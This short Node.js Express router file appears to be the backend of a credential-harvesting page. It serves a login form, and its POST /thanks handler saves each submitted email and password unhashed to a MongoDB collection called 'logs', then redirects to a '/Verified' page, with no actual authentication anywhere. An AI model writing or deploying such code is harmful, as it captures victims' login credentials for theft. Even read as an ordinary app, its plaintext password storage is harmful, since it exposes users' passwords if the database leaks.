const express = require('express');
const path = require('path');
const { getDb } = require('../utils/db');
const router = express.Router();

router.use('/login',(req,res,next) =>{
    // console.log("Ruta raiz sin iniciar sesión")
    res.sendFile(path.join(__dirname,'../views','login.html'));
});

router.post('/thanks', async (req, res, next) => {
    const db = getDb();
    const { email, password } = req.body;

    try {

        await db.collection('logs').insertOne({
            username: email,
            password: password
        });

        res.redirect('/Verified');
    } catch (e) {
        console.log(e);
        res.status(500).send('Error registrando al usuario')
    }
})

module.exports = router;